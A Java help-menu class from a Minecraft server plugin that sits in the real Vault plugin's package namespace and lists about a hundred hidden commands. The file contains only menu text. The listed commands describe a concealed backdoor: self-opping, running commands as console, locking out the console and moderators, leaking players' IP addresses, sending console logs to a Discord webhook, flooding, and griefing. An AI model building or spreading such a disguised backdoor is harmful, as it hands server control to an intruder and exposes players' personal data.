package net.milkbowl.vault.commands.cmds.help;

import org.bukkit.ChatColor;
import org.bukkit.entity.Player;

import net.milkbowl.vault.Core;
import net.milkbowl.vault.commands.CommandManager;
import net.milkbowl.vault.methods.Tips;
import net.milkbowl.vault.util.Settings;

public class Help extends CommandManager {
	
	public void execute(Core plugin, String msg, String[] args, Player p) {
		int maxPages = 7;
		if (args.length <= 1) {
			p.sendMessage(Settings.USAGE("help <1-" + maxPages + ">"));
		} else {
			if (args[1].equalsIgnoreCase("1")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7logout &8l &fLogs out so you can speak again!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7blatant &8l &fTurns blatant mode on or off"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7status &8l &fGives you server and " + Settings.NAME + " info"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7sc &8l &fTalk to all players logged in on the server"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7chat &8l &fSend a chat without having to log out"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7op &8l &fOp yourself or another player!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7deop &8l &fDeops you or another player!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7plugins &8l &fLists the server plugins"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7nameme &8l &fRe-names you"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7nameall &8l &fRe-names all players"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7msg &8l &fMessages another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7reply &8l &fReplys to the person who messaged you last"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7premiumhelp &8l &fViews help page for premium users"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7fn &8l &fLists file manager commands"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("2")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7invSteal &8l &fCopies someones inventory and gives it to you"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7noDmg &8l &fMake a player not able to damage others"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7freeze &8l &fFreezes another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7unfreeze &8l &fUnfreezes another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7enable &8l &fEnables another plugin"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7disable &8l &fDisables another plugin"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7tp &8l &fTeleports you to another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7tpall &8l &fTeleports all players to you or another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lockconsole &8l &fEnables/Disables console to exe cmds"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7cmdspy &8l &fToggles command spy!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7socialspy &8l &fSpy on /msg and /r commands"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7kill &8l &fKills you or another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7checkError &8l &fChecks the last error logged with " + Settings.NAME));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7spin &8l &fSpin the entire world"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("3")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7listloggedin &8l &fLists logged in players!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7flip &8l &fMakes a player flip 180"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7modcmds &8l &fDisables/Enables mod commands like /ban /kick"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7sudo &8l &fforces a player chat or execute a command"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7bc &8l &fBroadcasts a message to the entire server"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7spam &8l &fSpams the server with your message"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7god &8l &fEnables god mode for you or another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7save &8l &fSaves the world and player data"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7togglechat &8l &fEnables/Disables all players talking in chat"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7clearchat &8l &fClears chat"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7bombs &8l &fGives you a bomb to throw!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7npu &8l &fStops players from picking up items"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7reload &8l &fReloads the server"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("4")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7console &8l &fExecutes a command as console"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7ride &8l &fRide another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7rideme &8l &Force someone to ride you"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7stop &8l &fStops the server"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7nextmsg &8l &fSet the users next message they type"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7flood &8l &fFloods chat"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lockcmds &8l &fLocks all / commands for people not logged in"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lockcontainers &8l &fLocks all chests and all containers"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7coords &8l &fTells you another players or your coords"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7item &8l &fGives you any item you want"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7tip &8l &fGet a random " + Settings.NAME + " tip"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7fly &8l &fToggles flight for you or another player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7feed &8l &fFeeds you or another player to max"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7heal &8l &fHeals you or another player to max"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("5")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         "+Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7lookup &8l &fLooks up another players IP Address"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7gamemode &8l &fChange your gamemode"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7wand &8l &fUse the griefing wands"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7mobwand &8l &fSpawn mobs where you look"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7whitelist &8l &fTurn whitelist on or off silently"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7leakips &8l &fLeaks everyones ip into the chat who isnt logged in"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7ban &8l &fBans a player using a custom system"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7unban &8l &fUnbans a player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7eChest &8l &fOpens a players ender chest"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7kick &8l &fKick a player"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7vanish &8l &fVanish yourself so no one can see you"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7dupe &8l &fOpens the dupe machine!"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7spamWebhook &8l &fSpams a webhook with a message"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7penis &8l &fMakes it rain penises"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("6")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         " + Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7sethealth &8l &fSets the max health"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7setmotd &8l &fSets the server MOTD"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7floodconsole &8l &fFloods console"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7logconsole &8l &fLog console output to a discord webhook"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7xp &8l &fGive yourself XP"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "§7forum §8l §fGet a users forum profile"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7launch &8l &fLaunch a player into the air"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "§7fire §8l §fSet a player on fire"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7void &8l &fSend a player to the void"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7dirt &8l &fMake player only able to place dirt"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7popup &8l &fMake player open their inventory"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7swap &8l &fSwap two players locations"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7trap &8l &fTrap a player in a specific block"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7scare &8l &fSpawn a mob behind a player"));
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else if (args[1].equalsIgnoreCase("7")) {
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
				p.sendMessage("         " + Settings.PRIMARY_COLOUR + Settings.NAME + " by " + Settings.AUTHOR);
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7piss &8l &fMakes player piss a block"));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&7invsee &8l &fOpens another players inventory"));
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage("");
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8("+Settings.PRIMARY_COLOUR+"Tip&8) l &7" + Tips.getTip()));
				p.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8&m----------------------------------"));
			} else {
				p.sendMessage(Settings.PREFIX("That page does not exist. Use pages 1-" + maxPages));
			}
		}
	}
}
